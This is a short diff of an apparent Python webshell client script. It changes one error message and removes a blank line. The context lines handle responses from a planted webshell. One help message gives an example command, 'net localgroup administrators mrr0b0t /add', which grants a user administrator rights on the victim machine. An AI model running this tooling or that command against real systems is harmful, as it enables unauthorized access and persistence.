@@ -1,4 +1,3 @@
-  
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
@@ -21,7 +20,7 @@ try:
 			elif shell_req.status_code == 500:
 				print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
 			else:
-				print('(-) Something wrong IDK ~~')
+				print('(-) Something wrong IDK ~~\'')
 	else:
 		print('(-) Webshell not found!')
 except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
